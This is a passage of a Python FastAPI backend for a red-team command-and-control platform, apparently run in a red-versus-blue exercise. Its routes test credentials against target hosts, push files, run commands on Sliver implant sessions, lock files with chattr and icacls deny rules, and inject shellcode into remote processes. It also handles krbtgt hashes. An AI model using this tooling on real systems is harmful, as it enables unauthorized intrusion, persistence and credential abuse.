            is_domain_joined=bs.is_domain_joined, domain_username=domain_username,
            dc_ip=dc_ip, realm=realm, domain_sid=domain_sid,
            krbtgt_nthash=krbtgt_nthash, krbtgt_aes256=krbtgt_aes256,
            ticket_cred=ticket_snapshot,
        ))

    # 3. Aggregate + stamp the ticket row's `valid` (only on a full-team run, so
    #    a single-box probe never flips the badge on the other boxes' behalf).
    attempted = [r for r in results if r["valid"] is not None]
    aggregate = bool(attempted) and any(r["valid"] for r in attempted)
    if box_ip is None and attempted:
        def _stamp(db: Session) -> None:
            row = db.get(Credentials, cred_id)
            if row:
                row.valid = aggregate
        await write_actor.submit(_stamp, label="validate_ticket_stamp")

    return {
        "cred_id": cred_id,
        "team_num": team_num,
        "realm": realm,
        "valid": aggregate,
        "results": results,
    }


@router.post("/creds/test-all")
async def test_all_creds(current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """Test every credential that has a box_ip, updating valid flags concurrently."""
    if config.DEV_MODE:
        return {"tested": 0, "results": {}, "message": "[DEV] credential testing stubbed"}
    wrapper = _get_nxc_wrapper()

    with Session(engine) as session:
        rows = session.execute(
            select(Credentials).where(
                Credentials.box_ip.is_not(None),
                Credentials.is_infrastructure == False,  # noqa: E712
            )
        ).scalars().all()
        creds_data = [
            (c.cred_id, c.box_ip, c.protocol, c.username, c.password) for c in rows
        ]

    semaphore = asyncio.Semaphore(config.NXC_MAX_CONCURRENT)

    async def _test_one(
        cred_id: int, box_ip: str, protocol: str, username: str, password: str,
    ) -> tuple[int, bool]:
        async with semaphore:
            result = await wrapper.check_creds(box_ip, protocol, username, password)
            return cred_id, result.success

    outcomes = await asyncio.gather(*[_test_one(*c) for c in creds_data])

    # Single bulk UPDATE keyed on PK instead of one SELECT+write per cred.
    rows = [{"cred_id": cid, "valid": success} for cid, success in outcomes]
    if rows:
        def _bulk_update(session: Session) -> None:
            session.execute(update(Credentials), rows)

        await write_actor.submit(_bulk_update, label="test_all_creds")

    return {"tested": len(outcomes), "results": dict(outcomes)}


@router.post("/creds/{cred_id}/test")
async def test_cred(cred_id: int, current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """Test a single credential and update its valid flag."""
    if config.DEV_MODE:
        return {"cred_id": cred_id, "valid": True, "message": "[DEV] credential testing stubbed"}
    wrapper = _get_nxc_wrapper()

    with Session(engine) as session:
        cred = session.get(Credentials, cred_id)
        if not cred or cred.is_infrastructure:
            # Hide scoring-infrastructure creds from operators (404, not 403).
            raise cred_not_found()
        if not cred.box_ip:
            raise HTTPException(
                status_code=422, detail="Cannot test a global credential (no box_ip set)"
            )
        box_ip, protocol, username, password = (
            cred.box_ip, cred.protocol, cred.username, cred.password,
        )

    # Network check happens OUTSIDE the write transaction.
    result = await wrapper.check_creds(box_ip, protocol, username, password)

    def _set_valid(session: Session) -> None:
        cred = session.get(Credentials, cred_id)
        if cred is not None:
            cred.valid = result.success

    await write_actor.submit(_set_valid, label="test_cred")

    return {"cred_id": cred_id, "valid": result.success}


# ---------------------------------------------------------------------------
# Bulk exec / put-file legacy routes — REMOVED in exec-merge plan.
#
# Phase 3: ``POST /c2/exec`` + ``ExecRequest`` + ``ExecResult`` deleted.
# Phase 4: ``POST /c2/put-file`` deleted.
#
# Replacements:
#   ``POST /c2/bulk/exec/async``       (Sliver session/beacon + NXC, async)
#   ``POST /c2/bulk/put-file/stage``   (multipart staging)
#   ``POST /c2/bulk/put-file/async``   (NXC put-file fanout, async)
# ---------------------------------------------------------------------------
# Use ``POST /c2/bulk/put-file/stage`` + ``POST /c2/bulk/put-file/async`` for
# operator-driven file pushes; see ``fastapi_backend/c2/bulk_put_file.py``.


@router.post("/bulk/put-file/stage")
async def bulk_put_file_stage(
    file: UploadFile,
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Stage a file for later async ``POST /c2/bulk/put-file/async`` dispatch.

    Writes the uploaded bytes to ``$NXC_PATH/uploads/<uuid>_<filename>`` and
    inserts a ``StagedUploads`` row.  Returns ``{upload_id, filename, size_bytes}``.

    A background sweep loop purges rows older than 24h.
    """
    if config.DEV_MODE:
        return {"upload_id": "dev-stub", "filename": file.filename or "stub", "size_bytes": 0,
                "message": "[DEV] stage stubbed"}

    from fastapi_backend.database.models import StagedUploads  # cycle-break

    upload_dir = Path(config.NXC_PATH) / "uploads"
    upload_dir.mkdir(parents=True, exist_ok=True)
    upload_id = str(uuid.uuid4())
    safe_name = file.filename or "upload.bin"
    local_path = upload_dir / f"{upload_id}_{safe_name}"
    contents = await file.read()
    await asyncio.to_thread(local_path.write_bytes, contents)

    def _insert_staged(db: Session) -> None:
        db.add(StagedUploads(
            upload_id=upload_id,
            filename=safe_name,
            size_bytes=len(contents),
            local_path=str(local_path),
            operator=current_user.username,
        ))

    await write_actor.submit(_insert_staged, label="bulk_put_file_stage")

    return {"upload_id": upload_id, "filename": safe_name, "size_bytes": len(contents)}


@router.post("/bulk/put-file/async", status_code=202)
async def bulk_put_file_async(
    body: "BulkPutFileAsyncRequest",
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Submit a bulk put-file job and return immediately with a task id.

    Per-box progress lives on the resulting OperatorTask row.  Concurrent
    submissions from the same operator → ``409 another_bulk_put_file_running``.
    """
    from fastapi_backend.c2.bulk_exec import CredBoxMismatchError  # cycle-break
    from fastapi_backend.c2.bulk_put_file import (  # cycle-break
        BulkPutFileAsyncRequest,  # noqa: F401  -- forward-ref resolve
        _resolve_staged_upload,
        has_running_bulk_put_file,
        resolve_put_creds_per_box,
        run_bulk_put_file_background,
    )

    if not body.target_boxes:
        raise HTTPException(status_code=422, detail="target_boxes must be non-empty")
    if not body.remote_path.strip():
        raise HTTPException(status_code=422, detail="remote_path must be non-empty")
    if not body.upload_id.strip():
        raise HTTPException(status_code=422, detail="upload_id must be non-empty")

    # Validate staged-upload exists + on-disk file present
    try:
        _resolve_staged_upload(body.upload_id)
    except Exception as exc:
        raise HTTPException(status_code=422, detail=f"upload_id: {exc}") from exc

    if has_running_bulk_put_file(operator=current_user.username):
        raise HTTPException(
            status_code=409,
            detail={"code": "another_bulk_put_file_running"},
        )

    try:
        cred_map = resolve_put_creds_per_box(body.target_boxes, body.cred_type, body.cred_id)
    except CredBoxMismatchError as exc:
        raise HTTPException(status_code=422, detail=str(exc)) from exc
    missing_creds = [ip for ip, cred in cred_map.items() if cred is None]
    if missing_creds and not body.confirm_missing_creds:
        raise HTTPException(
            status_code=409,
            detail={
                "code": "missing_creds",
                "missing_boxes": missing_creds,
                "total_boxes": len(body.target_boxes),
            },
        )

    task_id = create_task(
        task_type="bulk_put_file",
        operator=current_user.username,
        team_num=None,
        target_boxes=body.target_boxes,
        metadata={
            "remote_path": body.remote_path,
            "upload_id": body.upload_id,
            "cred_type": body.cred_type,
            "cred_id": body.cred_id,
            "per_box_timeout_sec": body.per_box_timeout_sec,
        },
    )
    register_background_task(
        task_id, fire_and_forget(run_cancellable(task_id, run_bulk_put_file_background(body, task_id))),
    )
    return {"task_id": task_id, "status": "accepted"}


# ---------------------------------------------------------------------------
# File immutability
# ---------------------------------------------------------------------------


class ImmutabilityRequest(BaseModel):
    """POST /c2/iocs/apply-immutability request body."""

    box_ip: str
    file_path: str
    remove: bool = False


@router.post("/iocs/apply-immutability")
async def apply_file_immutability(
    body: ImmutabilityRequest,
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Apply or remove file immutability protection on a remote box.

    Linux: chattr +i / chattr -i
    Windows: attrib +R + icacls DENY + System integrity / reverse
    Firewall: chflags schg / chflags noschg
    """
    if config.DEV_MODE:
        return {"success": True, "output": "[DEV] immutability stubbed", "error": None}

    with Session(engine) as db:
        box = query_one(db, Boxes, box_ip=body.box_ip)
        if not box:
            raise box_not_found(body.box_ip)
        box_os = (box.os or "").lower()
        protocol = "smb" if box_os == "windows" else "ssh"
        cred = _get_best_cred(body.box_ip, db, protocol=protocol)
        if not cred:
            raise no_creds_for_box(body.box_ip)
        routed_host, routed_protocol, port = resolve_nxc_target(body.box_ip, protocol, db)
        username, password = cred.username, cred.password

    fp = body.file_path
    if box_os == "linux":
        flag = "-i" if body.remove else "+i"
        cmd, use_ps = f"chattr {flag} '{fp}'", False
    elif box_os == "windows":
        fp_s = fp.replace('"', "")
        if body.remove:
            cmd = (
                f'attrib -R "{fp_s}"; '
                f'icacls "{fp_s}" /remove:d Everyone; '
                f'icacls "{fp_s}" /setintegritylevel Medium'
            )
        else:
            cmd = (
                f'attrib +R "{fp_s}"; '
                f'icacls "{fp_s}" /deny Everyone:(D,DC); '
                f'icacls "{fp_s}" /setintegritylevel System'
            )
        use_ps = True
    elif box_os in ("firewall", "pfsense"):
        flag = "noschg" if body.remove else "schg"
        cmd, use_ps = f"chflags {flag} '{fp}'", False
    else:
        raise HTTPException(status_code=422, detail=f"Unsupported OS {box_os!r} for immutability")

    wrapper = _get_nxc_wrapper()
    try:
        result = await wrapper.execute(  # nxc-wrapper-bypass: immutable-apply
            routed_host, routed_protocol, username, password, cmd,
            powershell=use_ps, port=port,
            exec_method="smbexec" if routed_protocol == "smb" else None,
            sweep_after=True,  # scrub smbexec C:\ artifact (PLAN_kill_nxc_readback)
        )
    except Exception as exc:
        raise HTTPException(status_code=500, detail=str(exc)) from exc

    return {"success": result.success, "output": result.output or "", "error": result.error}


# ---------------------------------------------------------------------------
# Terminal-presence broadcast + box_ip lookup
# (docs/PLAN_targets_terminal_presence.md)
# ---------------------------------------------------------------------------

def _resolve_box_ip_for_session(session_id: str, interact: Any) -> str:
    """Return the Boxes-table box_ip for a Sliver session.

    Prefer the DB row (correct for pivot sessions, whose interact.remote_address
    holds the gateway IP, not the target box IP). Fall back to parsing the
    remote_address only when no Boxes row is bound to this session — new
    sessions in the window between _handle_implant_connect and the writer-actor
    commit.
    """
    with Session(engine) as db:
        row = db.execute(
            select(Boxes).where(Boxes.session_id == session_id)
        ).scalar_one_or_none()
        if row is not None and row.box_ip:
            return row.box_ip
    # Fallback: parse Sliver's remote_address (gateway-side for pivots — best we can do).
    from fastapi_backend.c2.sliver_manager import _extract_box_ip  # cycle-break
    ra = getattr(interact, "remote_address", "") or ""
    return _extract_box_ip(ra) if ra else "unknown"


async def _broadcast_terminal_presence(box_ip: str) -> None:
    """Fire the terminal_presence_update SSE event for one box.

    Never raises; a broadcast failure MUST not break the WS teardown path.
    """
    from fastapi_backend.c2.sliver_manager import sliver_manager  # cycle-break
    from fastapi_backend.c2.terminal_presence import get_tracker  # cycle-break
    try:
        sliver_manager.publish_event({
            "type": "terminal_presence_update",
            "box_ip": box_ip,
            "connections": get_tracker().connections_for(box_ip),
        })
    except Exception as exc:
        logger.warning("terminal_presence_broadcast_failed box=%s err=%s", box_ip, exc)


# ---------------------------------------------------------------------------
# SSE event stream
# ---------------------------------------------------------------------------

@router.get("/events")
async def c2_events(
    request: Request, token: str, current_user: Users = Depends(validate_token_param)
) -> StreamingResponse:
    """Server-Sent Events stream for C2 events.

    Token is passed as a query param because EventSource cannot set custom headers.
    Emits heartbeats every 15 s and forwards Sliver events when connected.
    """
    from fastapi_backend.c2.sliver_manager import sliver_manager  # cycle-break

    event_queue = sliver_manager.subscribe()

    async def generate() -> AsyncIterator[str]:
        heartbeat_interval = 15.0
        try:
            while True:
                # Reap on client disconnect — Starlette does not reliably cancel a
                # StreamingResponse generator parked on queue.get() under load, so an
                # un-checked loop holds the subscriber queue + leaves the socket in
                # CLOSE_WAIT. (2026-06-26 full soak wedged the backend at ~1457 such
                # leaked SSE conns.) Checked once per heartbeat → reaps within 15 s.
                if await request.is_disconnected():
                    break
                # Wait for an event or timeout (heartbeat)
                try:
                    payload = await asyncio.wait_for(event_queue.get(), timeout=heartbeat_interval)
                    event_type = payload.get("type", "message")
                    # Backend-side role gate: blue teams must never see who is
                    # driving a terminal on a target box (they'd see the whole
                    # red workflow via devtools). Client-only hiding is insufficient.
                    if event_type == "terminal_presence_update" and current_user.is_blue_team:
                        continue
                    data = json.dumps(payload)
                    yield f"event: {event_type}\ndata: {data}\n\n"
                except TimeoutError:
                    yield "event: heartbeat\ndata: {}\n\n"
        except asyncio.CancelledError:
            pass
        finally:
            sliver_manager.unsubscribe(event_queue)

    return StreamingResponse(
        generate(),
        media_type="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "X-Accel-Buffering": "no",
            "Connection": "keep-alive",
        },
    )


# ---------------------------------------------------------------------------
# Alerts
# ---------------------------------------------------------------------------

@router.get("/alerts")
async def get_alerts(
    since: str | None = None,
    severity: str | None = None,
    kind: str | None = None,
    box_ip: str | None = None,
    team_num: int | None = None,
    unread_only: bool = False,
    limit: int = Query(default=50, le=200),
    offset: int = Query(default=0, ge=0),
    current_user: Users = Depends(get_current_user),
) -> dict[str, Any]:
    """List alerts with optional filtering."""
    from datetime import datetime  # cycle-break

    from sqlalchemy import and_, desc, func, select  # cycle-break
    from sqlalchemy.orm import Session  # cycle-break

    from fastapi_backend.database.db_writer import engine  # cycle-break
    from fastapi_backend.database.models import AlertReads, Alerts  # cycle-break

    with Session(engine) as session:
        # Base query
        query = select(Alerts)

        # Add filters
        filters = []
        if since:
            try:
                since_dt = datetime.fromisoformat(since.replace("Z", "+00:00"))
                filters.append(Alerts.created_at >= since_dt)
            except ValueError as exc:
                raise HTTPException(status_code=400, detail="Invalid since timestamp") from exc

        if severity:
            filters.append(Alerts.severity == severity)

        if kind:
            filters.append(Alerts.kind == kind)

        if box_ip:
            filters.append(Alerts.box_ip == box_ip)

        if team_num is not None:
            filters.append(Alerts.team_num == team_num)

        if filters:
            query = query.where(and_(*filters))

        # Handle unread_only filter
        if unread_only:
            # Only alerts that don't have a read record for current user
            subquery = select(AlertReads.alert_id).where(AlertReads.user_id == current_user.user_id)
            query = query.where(~Alerts.id.in_(subquery))

        # Order by most recent first
        query = query.order_by(desc(Alerts.created_at))

        # Get total count for pagination
        count_query = select(func.count()).select_from(query.subquery())
        total_count = session.execute(count_query).scalar()

        # Apply pagination
        query = query.offset(offset).limit(limit)

        # Execute query
        alerts = session.execute(query).scalars().all()

        # Get read status for current user
        read_alert_ids = set()
        if alerts:
            alert_ids = [a.id for a in alerts]
            read_query = select(AlertReads.alert_id).where(
                and_(AlertReads.user_id == current_user.user_id,
                     AlertReads.alert_id.in_(alert_ids))
            )
            read_alert_ids = set(session.execute(read_query).scalars().all())

        # Format response
        result = []
        for alert in alerts:
            import json  # cycle-break
            result.append({
                "id": alert.id,
                "created_at": alert.created_at.isoformat(),
                "severity": alert.severity,
                "kind": alert.kind,
                "box_ip": alert.box_ip,
                "team_num": alert.team_num,
                "summary": alert.summary,
                "details": json.loads(alert.details_json),
                "unread": alert.id not in read_alert_ids,
            })

        return {
            "alerts": result,
            "total": total_count,
            "limit": limit,
            "offset": offset,
        }


@router.post("/alerts/{alert_id}/read")
async def mark_alert_read(
    alert_id: int,
    current_user: Users = Depends(get_current_user),
) -> dict[str, Any]:
    """Mark an alert as read for the current user."""
    from sqlalchemy import and_  # cycle-break
    from sqlalchemy.orm import Session  # cycle-break

    from fastapi_backend.database.models import AlertReads, Alerts  # cycle-break

    def _mark_read(session: Session) -> None:
        # Verify alert exists
        alert = session.get(Alerts, alert_id)
        if not alert:
            raise HTTPException(status_code=404, detail="Alert not found")

        # Upsert AlertReads record
        existing = session.execute(
            select(AlertReads).where(
                and_(AlertReads.alert_id == alert_id,
                     AlertReads.user_id == current_user.user_id)
            )
        ).scalar_one_or_none()

        if not existing:
            session.add(AlertReads(
                alert_id=alert_id,
                user_id=current_user.user_id
            ))

    await write_actor.submit(_mark_read, label="mark_alert_read")
    return {"status": "marked_read"}


@router.delete("/alerts/{alert_id}")
async def delete_alert(
    alert_id: int,
    admin_user: Users = Depends(require_admin),
) -> dict[str, Any]:
    """Delete an alert (admin only)."""
    from sqlalchemy.orm import Session  # cycle-break

    from fastapi_backend.database.models import Alerts  # cycle-break

    def _delete_alert(session: Session) -> None:
        alert = session.get(Alerts, alert_id)
        if not alert:
            raise HTTPException(status_code=404, detail="Alert not found")
        session.delete(alert)

    await write_actor.submit(_delete_alert, label="delete_alert")
    return {"status": "deleted"}


# ---------------------------------------------------------------------------
# Sessions (Sliver)
# ---------------------------------------------------------------------------

@router.get("/sliver/status")
async def sliver_status(current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """Return Sliver C2 connection status."""
    from fastapi_backend.c2.sliver_manager import sliver_manager  # cycle-break
    return {"connected": sliver_manager.is_connected()}


class SessionExecRequest(BaseModel):
    """POST /c2/sessions/{id}/exec request body."""

    command: str
    args: list[str] = []


@router.get("/sessions")
async def list_sessions(
    include_dead: bool = Query(default=False),
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """List Sliver sessions with box attribution."""
    if config.DEV_MODE:
        with Session(engine) as db:
            stmt = select(DevSession)
            if not include_dead:
                stmt = stmt.where(DevSession.is_dead == False)  # noqa: E712
            rows = db.execute(stmt).scalars().all()
            return {"sessions": [_dev_row_to_dict(r) for r in rows]}
    client = _get_sliver_client()
    from fastapi_backend.c2.serialize import serialize_session  # cycle-break

    sessions = await client.sessions()
    if not include_dead:
        sessions = [s for s in sessions if not getattr(s, "IsDead", False)]
    result = []
    with Session(engine) as db:
        for s in sessions:
            d = serialize_session(s)
            raw_addr = s.RemoteAddress or ""
            ip = raw_addr.split(":")[0] if raw_addr else None
            if ip:
                box = None
                # Prefer session_id lookup: sliver_manager stores the actual
                # target box (not the pivot relay) under Boxes.session_id.
                box = db.execute(
                    select(Boxes).where(Boxes.session_id == s.ID)
                ).scalar_one_or_none()
                if box is None:
                    # Sliver pivot connections include "->" in RemoteAddress
                    # (e.g. "1.2.3.4:port->TCP->"); use Hostname to find real box.
                    if "->" in raw_addr:
                        from fastapi_backend.c2.sliver_manager import (  # cycle-break
                            box_by_hostname,
                        )
                        box = box_by_hostname(db, s.Hostname)
                if box is None:
                    box = db.execute(
                        select(Boxes).where(Boxes.box_ip == ip)
                    ).scalar_one_or_none()
                d["box_name"] = box.box_name if box else None
                d["team_num"] = box.team_num if box else None
                d["box_ip"] = box.box_ip if box else ip
            else:
                d["box_name"] = None
                d["team_num"] = None
                d["box_ip"] = None
            result.append(d)
    return {"sessions": result}


@router.get("/sessions/{session_id}")
async def get_session(session_id: str, current_user: Users = Depends(require_non_blue)) -> dict[str, Any]:
    """Return one Sliver session by id."""
    if config.DEV_MODE:
        with Session(engine) as db:
            row = db.get(DevSession, session_id)
            if not row:
                raise HTTPException(status_code=404, detail="Session not found")
            return _dev_row_to_dict(row)
    client = _get_sliver_client()
    from fastapi_backend.c2.serialize import serialize_session  # cycle-break

    sessions = await client.sessions()
    for s in sessions:
        if session_id == s.ID:
            return serialize_session(s)
    raise HTTPException(status_code=404, detail="Session not found")


@router.get("/sessions/{session_id}/ps")
async def session_ps(
    session_id: str,
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Return the Sliver session's live process list.

    Used by inject-target pickers to choose a process actually running on
    the box (matching the same `interact.ps()` source the inject path uses).
    Returns ``{"processes": [{"pid", "name", "owner"}, ...]}``.
    """
    if config.DEV_MODE:
        return {"processes": [{"pid": 1, "name": "init", "owner": "root"}]}
    client = _get_sliver_client()
    interact = await client.interact_session(session_id)
    if not interact:
        raise HTTPException(status_code=404, detail="Session not found")
    ps_result = await interact.ps()
    # Sliver SDK versions differ — newer returns iterable of protobuf Process;
    # older returns an Ps wrapper with `.Processes`.  Handle both.
    iterable = getattr(ps_result, "Processes", None)
    if iterable is None:
        iterable = ps_result if hasattr(ps_result, "__iter__") else []
    procs = []
    for p in iterable:
        procs.append({
            "pid":   int(getattr(p, "Pid", 0) or 0),
            "name":  getattr(p, "Executable", "") or "",
            "owner": getattr(p, "Owner", "") or "",
        })
    return {"processes": procs}


@router.post("/sessions/{session_id}/exec")
async def exec_on_session(
    session_id: str,
    body: SessionExecRequest,
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Run one command synchronously on a Sliver session."""
    if config.DEV_MODE:
        return {"stdout": f"[DEV] {body.command}: stub output\n", "stderr": "", "status": 0}
    client = _get_sliver_client()
    parts = body.command.split()
    exe = parts[0] if parts else body.command
    args = body.args if body.args else parts[1:]

    interact = await client.interact_session(session_id)
    if not interact:
        raise HTTPException(status_code=404, detail="Session not found")

    # Phase 5 (exec-merge): write to OperatorTask (task_type='exec_single')
    # instead of the legacy ExecTask table — sidebar v2 reads from /c2/tasks.
    from fastapi_backend.core.task_tracker import (  # cycle-break
        create_task,
        finish_task,
        start_task,
        update_box_progress,
    )

    with Session(engine) as db:
        box = query_one(db, Boxes, session_id=session_id)
        box_ip = box.box_ip if box else "unknown"
        team_num = box.team_num if box else None

    operator_task_id = create_task(
        task_type="exec_single",
        operator=current_user.username,
        team_num=team_num,
        target_boxes=[box_ip],
        metadata={
            "implant_type": "session",
            "implant_id": session_id,
            "command": body.command,
            "args": args,
            "sliver_task_id": None,
        },
    )
    start_task(operator_task_id)
    update_box_progress(operator_task_id, box_ip, "running")

    result = await interact.execute(exe, args, output=True)
    stdout = result.Stdout.decode(errors="replace") if result.Stdout else ""
    stderr = result.Stderr.decode(errors="replace") if result.Stderr else ""

    update_box_progress(
        operator_task_id, box_ip, "done",
        details=json.dumps({"stdout": stdout, "stderr": stderr, "exit_code": result.Status}, default=str),
    )
    finish_task(operator_task_id, "done")

    return {
        "operator_task_id": operator_task_id,
        "stdout": stdout, "stderr": stderr, "status": result.Status,
    }


@router.post("/sessions/{session_id}/upload")
async def upload_to_session(
    session_id: str,
    file: UploadFile,
    remote_path: str = Form(...),
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Upload a file to a Sliver session at remote_path."""
    if config.DEV_MODE:
        data = await file.read()
        return {"success": True, "remote_path": remote_path, "size": len(data)}
    client = _get_sliver_client()
    interact = await client.interact_session(session_id)
    if not interact:
        raise HTTPException(status_code=404, detail="Session not found")

    data = await file.read()
    await interact.upload(remote_path, data=data)
    return {"success": True, "remote_path": remote_path, "size": len(data)}


@router.post("/sessions/{session_id}/download")
async def download_from_session(
    session_id: str,
    remote_path: str,
    current_user: Users = Depends(require_non_blue),
) -> StreamingResponse:
    """Stream a file from a Sliver session back to the operator."""
    if config.DEV_MODE:
        filename = Path(remote_path).name
        return StreamingResponse(
            iter([b""]),
            media_type="application/octet-stream",
            headers={"Content-Disposition": f'attachment; filename="{filename}"'},
        )
    client = _get_sliver_client()
    interact = await client.interact_session(session_id)
    if not interact:
        raise HTTPException(status_code=404, detail="Session not found")

    result = await interact.download(remote_path)
    data = result.Data
    # Sliver gzip-compresses file data for transfer and sets Encoder='gzip';
    # sliver-py returns the raw Download protobuf without decompressing, so we
    # must do it here or the operator receives compressed bytes (soak 2026-06-18
    # Phase 2.5: download returned 200 but the bytes did not match the upload).
    if result.Encoder == "gzip":
        data = gzip.decompress(data)
    filename = Path(remote_path).name
    return StreamingResponse(
        iter([data]),
        media_type="application/octet-stream",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


class InjectShellcodeRequest(BaseModel):
    """POST /c2/sessions/{session_id}/inject-shellcode request body."""

    ioc_name: str
    target_process: str = "spoolsv"
    # Phase 2d combo: when True, post-deploy persistence hook applies
    # immutability to PersistenceMechanism.protect_paths.  Ignored when the
    # IOC has no persistence.  "binary_only" is meaningless for inject IOCs
    # (no on-disk binary), but accepted for API symmetry.
    apply_immutable: bool = False
    immutable_scope: str = "binary_only"


@router.post("/sessions/{session_id}/inject-shellcode", status_code=202)
async def inject_shellcode(
    session_id: str,
    req: InjectShellcodeRequest,
    current_user: Users = Depends(require_non_blue),
) -> dict[str, Any]:
    """Inject shellcode into a process via an active Sliver session.

    Returns {task_id} immediately (202). Progress via GET /c2/tasks/{task_id}.
    Only valid for IOCs with sliver_inject=True.
    """
    from fastapi_backend.core.ioc_definition import IOCDefinitionLoader  # cycle-break

    # Resolve IOC definition
    try:
        from fastapi_backend.utils.dependencies import get_orchestrator  # cycle-break
        _orch = get_orchestrator()
        _loader = _orch.ioc_loader
    except Exception:
        _loader = IOCDefinitionLoader()
        if not _loader.ioc_definitions:
            _loader.load_ioc_definitions()

    ioc = _loader.ioc_definitions.get(req.ioc_name)
    if not ioc:
        raise HTTPException(status_code=400, detail=f"Unknown IOC: {req.ioc_name!r}")
    if not getattr(ioc, "sliver_inject", False):
        raise HTTPException(status_code=400, detail=f"IOC {req.ioc_name!r} does not use inject endpoint")

    # Verify session exists
    if config.DEV_MODE:
        box_ip = "127.0.0.1"
    else:
        client = _get_sliver_client()
        sessions = await client.sessions()
        session_obj = next((s for s in sessions if session_id == s.ID), None)
        if session_obj is None:
            raise HTTPException(status_code=404, detail=f"Session {session_id!r} not found")
        # Prefer the Boxes-table box_ip so pivot sessions resolve to the actual
        # Windows target (not the pfSense relay whose RemoteAddress appears first).
        # Fall back to RemoteAddress extraction if no DB row covers this session.
        with Session(engine) as _db:
            _box_row = _db.execute(
                select(Boxes).where(Boxes.session_id == session_id)
            ).scalar_one_or_none()
        if _box_row is not None:
            box_ip = _box_row.box_ip
        else:
            raw_addr = getattr(session_obj, "RemoteAddress", "") or ""
            box_ip = raw_addr.split("->")[-1].split(":")[0] if raw_addr else ""

    task_id = create_task(
        task_type="deploy",
        operator=current_user.username,
        team_num=None,
        target_boxes=[box_ip] if box_ip else [],
        metadata={"ioc_name": req.ioc_name, "session_id": session_id},
    )

    register_background_task(task_id, fire_and_forget(run_cancellable(task_id, _bg_inject_shellcode(
        task_id=task_id,
        session_id=session_id,
        ioc=ioc,
        box_ip=box_ip,
        target_process=req.target_process,
        operator=current_user.username,
        apply_immutable=req.apply_immutable,
        immutable_scope=req.immutable_scope,
    ))))

    return {"task_id": task_id}


# Processes whose death bugchecks Windows (CRITICAL_PROCESS_DIED, 0xEF). Never
# inject into these regardless of what the caller asked for.
_NEVER_INJECT_NAMES = frozenset({
    "lsass", "services", "csrss", "wininit", "smss", "winlogon",
})

# svchost service groups that ARE marked critical (verified on Server 2025 via
# NtQueryInformationProcess/ProcessBreakOnTermination: every other group on the
# box reported 0):
#   -k DcomLaunch -> BrokerInfrastructure, DcomLaunch, PlugPlay, Power, SystemEventsBroker
#   -k RPCSS      -> RpcEptMapper, RpcSs
_CRITICAL_SVCHOST_GROUPS = ("dcomlaunch", "rpcss")


def _select_inject_pid(processes: "list[Any]", target_process: str) -> "int | None":
    """Pick a SAFE pid for `target_process` from a Sliver ps() listing.

    Matching by name and taking the FIRST hit — what this used to do — is how a
    box gets bricked: a Server 2025 host runs ~24 svchost.exe instances and the
    first one in ps order is a low-PID early-boot instance, i.e. `-k DcomLaunch`
    or `-k RPCSS`, both of which are critical. Injecting there raises
    CRITICAL_PROCESS_DIED (0xEF) and the box BSODs; repeated dirty boots then
    drop it into WinRE, where it sits unreachable with the hypervisor still
    reporting the VM as "running". 192.168.1.231 collected five 0xEF minidumps
    that way.

    So: reject unconditionally-critical names, reject critical svchost groups by
    CmdLine, and only then take the first survivor. Returns None when nothing
    safe matches — the caller reports that rather than injecting blind.
    """
    want = target_process.lower().replace(".exe", "")
    if want in _NEVER_INJECT_NAMES:
        return None
    for proc in processes:
        pname = (getattr(proc, "Executable", "") or "").lower().replace(".exe", "")
        if pname != want:
            continue
        if pname in _NEVER_INJECT_NAMES:
            continue
        cmdline = (getattr(proc, "CmdLine", "") or "")
        if isinstance(cmdline, (list, tuple)):
            cmdline = " ".join(str(c) for c in cmdline)
        low = cmdline.lower()
        if pname == "svchost" and any(f"-k {g}" in low for g in _CRITICAL_SVCHOST_GROUPS):
            continue  # critical service group — skipping keeps the box alive
        pid = getattr(proc, "Pid", None)
        if pid:
            return int(pid)
    return None


async def _fallback_pgrep_procs(interact: Any, target_process: str) -> "list[Any]":
    """Duck-typed Process list from `pgrep -l -f <target>` on the target box.

    Fallback path for Sliver interact.ps() when the server responds with
    gRPC UNIMPLEMENTED — the FreeBSD Sliver implementation ships without
    the ps command, so firewall_self_inject / firewall_self_inject_devd
    (pfSense/FreeBSD targets) hit this every run. `pgrep -l -f <target>`
    works on Linux + FreeBSD + macOS: each line is `<pid> <cmdline>`
    (see FreeBSD pgrep(1); Linux procps-ng same shape).

    Wraps each match in a SimpleNamespace exposing the three attributes
    _select_inject_pid reads (Executable, CmdLine, Pid). Executable is
    forced to `target_process` because the caller matched it via `-f`
    against argv — the true p_comm may differ (pfSense syslogd shows as
    `.sysdb` in p_comm but its argv[0] is `[syslogd]`, so `-f syslogd`
    matches by cmdline while p_comm would miss).

    Empty output → empty list → _select_inject_pid returns None and the
    caller reports "no safe pid for X" as usual.
    """
    from types import SimpleNamespace  # cycle-break

    try:
        res = await interact.execute("pgrep", ["-l", "-f", target_process], output=True)
    except Exception:
        raise
    stdout_bytes = getattr(res, "Stdout", b"") or b""
    if isinstance(stdout_bytes, str):
        stdout = stdout_bytes
    else:
        stdout = stdout_bytes.decode("utf-8", errors="replace")
    procs: list[Any] = []
    for line in stdout.splitlines():
        line = line.strip()
        if not line:
            continue
        head, _, tail = line.partition(" ")
        if not head.isdigit():
            continue
        procs.append(SimpleNamespace(
            Executable=target_process, CmdLine=tail or target_process, Pid=int(head),
        ))
    return procs


async def _bg_inject_shellcode(
    *,
    task_id: int,
    session_id: str,
    ioc: Any,
    box_ip: str,
    target_process: str,
    operator: str,
    apply_immutable: bool = False,
    immutable_scope: str = "binary_only",
) -> None:
    """Background: inject shellcode via Sliver session."""
    from fastapi_backend.core.payload_resolver import (  # cycle-break
        PayloadResolutionError,
        _resolve_ioc_payload,
    )

    start_task(task_id)

    if config.DEV_MODE:
        update_box_progress(task_id, box_ip, "done",
                            details=json.dumps({"pid_injected": 1234, "ioc_name": ioc.name}))
        finish_task(task_id, "done")
        return

